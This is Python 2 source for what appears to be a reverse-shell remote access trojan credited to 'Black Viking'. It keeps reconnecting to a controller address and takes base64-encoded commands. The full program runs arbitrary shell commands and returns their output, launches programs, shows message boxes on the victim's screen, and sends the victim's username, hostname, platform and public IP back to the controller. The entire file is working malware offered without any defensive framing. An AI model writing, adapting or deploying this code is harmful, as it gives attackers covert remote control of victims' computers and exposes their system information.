#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
[~] Version: 0.2
"""

from Tkinter import *
import socket
import subprocess
import os
import sys
import base64
import threading
import urllib2
import re
import getpass
import platform
import time
import re

HOST = '127.0.0.1'
PORT = int('8000')

def crypt(TEXT, encode=True):
    if encode == True:
        return base64.b64encode(TEXT)
    else:
        return base64.b64decode(TEXT)

def send(data):
    s.sendall(crypt(os.getcwd()))
    s.sendall(crypt(data))
    
def messageBox(message):
    root = Tk()
    root.attributes('-topmost', True)
    root.title(message)
    z = Label(text=message)
    z.pack()
    root.mainloop()
    
def info():
    try:
        ip = re.findall('": "(.*?)"', urllib2.urlopen("http://my-ip.herokuapp.com/").read())[0]
    except:
        ip = "x.x.x.x"
        pass    

    message = """
[>] Username\t: %s
[>] Hostname\t: %s
[>] System\t: %s
[>] Date\t: %s
[>] IP Adress\t: %s
"""%(getpass.getuser(), socket.gethostname(), platform.platform(), time.strftime("%c"), ip)
    send(message)

def connect():
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((HOST, PORT))
    except:
        connect() 
    

def main():
    while True:
        command = crypt(s.recv(1024), False)
        if command[:2].decode("utf-8") == 'cd':
            try:
                os.chdir(command[3:].decode("utf-8"))
                send(" ")
            except OSError:
                send("%s: No such file or directory"%(command[3:]))

        elif command == "info()":
            info()
            main()

        elif "execute" in command:
            command = command.replace("execute ", "")
            subprocess.Popen(command, shell=True)
            send("Running program in a new process\n")
            
        elif "message" in command:
            messageBox(command.replace("message ", ""))
            send(" ")
            
        elif command == "pwd":
            send(os.getcwd()+"\n")

        else:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            output = process.stdout.read() + process.stderr.read()
            if output == "":
                output = " "
            send(output)
            
    s.close()

def start():
    while True:
		try:
	    	connect()
	    	send(socket.gethostname())
	    	main()
		except:
	    	start()


if __name__ == "__main__":
    start()
